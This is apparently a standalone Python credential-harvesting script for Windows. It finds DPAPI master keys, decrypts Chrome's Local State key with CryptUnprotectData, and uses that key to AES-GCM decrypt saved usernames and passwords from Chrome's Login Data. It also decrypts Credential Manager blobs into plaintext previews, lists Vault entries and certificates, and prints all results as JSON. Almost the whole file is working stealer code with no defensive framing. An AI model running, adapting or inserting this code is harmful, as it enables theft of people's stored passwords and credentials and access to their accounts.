import os
import sys
import json
import struct
import hashlib
import binascii
import glob
import platform
import subprocess
import sqlite3
import base64

def dpapi_full_harvest():
    """Full DPAPI credential decryption pipeline.
    Phase 1: Locate and extract DPAPI master keys from %APPDATA%/Microsoft/Protect/<SID>/
    Phase 2: Find DPAPI-encrypted blobs (Chrome Local State, Credential Manager, Vault)
    Phase 3: Attempt decryption using CryptUnprotectData (current user session)
    Phase 4: Extract Chrome AES-GCM key from Local State + decrypt Login Data passwords
    Also extracts DPAPI backup key from Domain Controller if accessible.
    """
    if platform.system() != 'Windows':
        # Cross-platform: parse DPAPI structures from files (offline analysis)
        return dpapi_offline_parse()

    results = {'master_keys': [], 'chrome_key': None, 'chrome_passwords': [],
               'credential_blobs': [], 'vault_entries': [], 'certificates': []}

    appdata = os.environ.get('APPDATA', '')
    localappdata = os.environ.get('LOCALAPPDATA', '')
    userprofile = os.environ.get('USERPROFILE', '')

    # Phase 1: Enumerate DPAPI master keys
    protect_dir = os.path.join(appdata, 'Microsoft', 'Protect')
    if os.path.isdir(protect_dir):
        for sid_dir in os.listdir(protect_dir):
            sid_path = os.path.join(protect_dir, sid_dir)
            if os.path.isdir(sid_path) and sid_dir.startswith('S-1-5-'):
                for mk_file in os.listdir(sid_path):
                    mk_path = os.path.join(sid_path, mk_file)
                    if os.path.isfile(mk_path) and mk_file != 'Preferred':
                        try:
                            with open(mk_path, 'rb') as f:
                                header = f.read(36)
                            if len(header) >= 36:
                                version, = struct.unpack_from('<I', header, 0)
                                results['master_keys'].append({
                                    'sid': sid_dir, 'guid': mk_file,
                                    'path': mk_path, 'version': version,
                                    'size': os.path.getsize(mk_path)
                                })
                        except (PermissionError, IOError):
                            pass

    # Phase 2: Chrome DPAPI key extraction
    chrome_local_state = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Local State')
    if os.path.isfile(chrome_local_state):
        try:
            with open(chrome_local_state, 'r') as f:
                state = json.load(f)
            encrypted_key_b64 = state.get('os_crypt', {}).get('encrypted_key', '')
            if encrypted_key_b64:
                encrypted_key = base64.b64decode(encrypted_key_b64)
                # Strip 'DPAPI' prefix (5 bytes)
                if encrypted_key[:5] == b'DPAPI':
                    dpapi_blob = encrypted_key[5:]
                    results['chrome_key'] = {
                        'local_state_path': chrome_local_state,
                        'encrypted_key_len': len(dpapi_blob),
                        'dpapi_blob_hex': dpapi_blob[:32].hex(),
                    }
                    # Try CryptUnprotectData
                    try:
                        import ctypes
                        import ctypes.wintypes
                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
                        p_decrypt = ctypes.windll.crypt32.CryptUnprotectData
                        blob_in = DATA_BLOB(len(dpapi_blob), ctypes.create_string_buffer(dpapi_blob, len(dpapi_blob)))
                        blob_out = DATA_BLOB()
                        if p_decrypt(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                            aes_key = bytes(ctypes.string_at(blob_out.pbData, blob_out.cbData))
                            results['chrome_key']['decrypted'] = True
                            results['chrome_key']['aes_key_hex'] = aes_key.hex()
                            # Phase 3: Decrypt Chrome passwords
                            results['chrome_passwords'] = decrypt_chrome_passwords(aes_key)
                    except Exception as e:
                        results['chrome_key']['decrypt_error'] = str(e)[:100]
        except (json.JSONDecodeError, IOError) as e:
            results['chrome_local_state_error'] = str(e)[:100]

    # Phase 3: Credential Manager blobs
    cred_dirs = [
        os.path.join(appdata, 'Microsoft', 'Credentials'),
        os.path.join(localappdata, 'Microsoft', 'Credentials'),
    ]
    for cred_dir in cred_dirs:
        if os.path.isdir(cred_dir):
            for entry in os.listdir(cred_dir):
                blob_path = os.path.join(cred_dir, entry)
                if os.path.isfile(blob_path):
                    try:
                        with open(blob_path, 'rb') as f:
                            blob_data = f.read()
                        # Parse DPAPI blob header
                        if len(blob_data) >= 36:
                            version, provider_guid = struct.unpack_from('<I', blob_data, 0)[0], blob_data[4:20].hex()
                            results['credential_blobs'].append({
                                'path': blob_path, 'size': len(blob_data),
                                'version': version, 'provider_guid': provider_guid,
                            })
                            # Try CryptUnprotectData on the blob
                            try:
                                blob_in = DATA_BLOB(len(blob_data), ctypes.create_string_buffer(blob_data, len(blob_data)))
                                blob_out = DATA_BLOB()
                                if p_decrypt(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                                    decrypted = bytes(ctypes.string_at(blob_out.pbData, blob_out.cbData))
                                    results['credential_blobs'][-1]['decrypted'] = True
                                    results['credential_blobs'][-1]['plaintext_preview'] = decrypted[:200].decode('utf-8', errors='replace')
                            except Exception:
                                pass
                    except (PermissionError, IOError):
                        pass

    # Phase 4: Windows Vault
    vault_dirs = glob.glob(os.path.join(localappdata, 'Microsoft', 'Vault', '*'))
    for vault_dir in vault_dirs:
        if os.path.isdir(vault_dir):
            for item in os.listdir(vault_dir):
                item_path = os.path.join(vault_dir, item)
                if os.path.isfile(item_path):
                    results['vault_entries'].append({
                        'vault': os.path.basename(vault_dir),
                        'file': item, 'size': os.path.getsize(item_path)
                    })

    # Phase 5: DPAPI-encrypted certificates
    cert_dir = os.path.join(appdata, 'Microsoft', 'SystemCertificates', 'My', 'Certificates')
    if os.path.isdir(cert_dir):
        for cert in os.listdir(cert_dir):
            results['certificates'].append({'name': cert, 'path': os.path.join(cert_dir, cert)})

    results['summary'] = {
        'master_keys_found': len(results['master_keys']),
        'chrome_key_decrypted': bool(results.get('chrome_key', {}).get('decrypted')),
        'chrome_passwords_decrypted': len(results['chrome_passwords']),
        'credential_blobs': len(results['credential_blobs']),
        'vault_entries': len(results['vault_entries']),
        'certificates': len(results['certificates']),
    }
    return results

def decrypt_chrome_passwords(aes_key):
    """Decrypt Chrome Login Data using AES-GCM key."""
    import shutil, tempfile
    localappdata = os.environ.get('LOCALAPPDATA', '')
    passwords = []
    for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3']:
        db_path = os.path.join(localappdata, 'Google', 'Chrome', 'User Data', profile, 'Login Data')
        if not os.path.isfile(db_path):
            continue
        tmp_fd, tmp_path = tempfile.mkstemp(suffix='.db')
        os.close(tmp_fd)
        try:
            shutil.copy2(db_path, tmp_path)
            conn = sqlite3.connect(tmp_path)
            cursor = conn.execute('SELECT origin_url, username_value, password_value FROM logins')
            for url, user, enc_pass in cursor.fetchall():
                if not user or not enc_pass:
                    continue
                try:
                    # Chrome v80+ AES-GCM: 3-byte prefix 'v10'/'v11' + 12-byte nonce + ciphertext + 16-byte tag
                    if enc_pass[:3] in (b'v10', b'v11'):
                        nonce = enc_pass[3:15]
                        ciphertext = enc_pass[15:]
                        # AES-GCM decrypt
                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                        aesgcm = AESGCM(aes_key)
                        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
                        passwords.append({'url': url, 'username': user, 'password': plaintext.decode('utf-8', errors='replace')})
                    else:
                        # Older DPAPI-only encryption
                        passwords.append({'url': url, 'username': user, 'password': '[DPAPI-encrypted, needs CryptUnprotectData]'})
                except Exception:
                    passwords.append({'url': url, 'username': user, 'password': '[decrypt_failed]'})
            conn.close()
        finally:
            os.unlink(tmp_path)
    return passwords

def dpapi_offline_parse():
    """Offline DPAPI analysis for non-Windows systems (parse structure from files)."""
    results = {'mode': 'offline', 'dpapi_blobs': [], 'master_key_files': []}
    # Scan for DPAPI blob files (common after forensic collection)
    for pattern in ['*.dmp', '*.bin', '*.dpapi', 'Credentials/*']:
        for path in glob.glob(pattern, recursive=True):
            try:
                with open(path, 'rb') as f:
                    header = f.read(4)
                if header == b'\x01\x00\x00\x00':  # DPAPI blob version 1
                    results['dpapi_blobs'].append({'path': path, 'size': os.path.getsize(path)})
            except Exception:
                pass
    return results

if __name__ == '__main__':
    out = dpapi_full_harvest()
    print(json.dumps(out, indent=2, default=str))

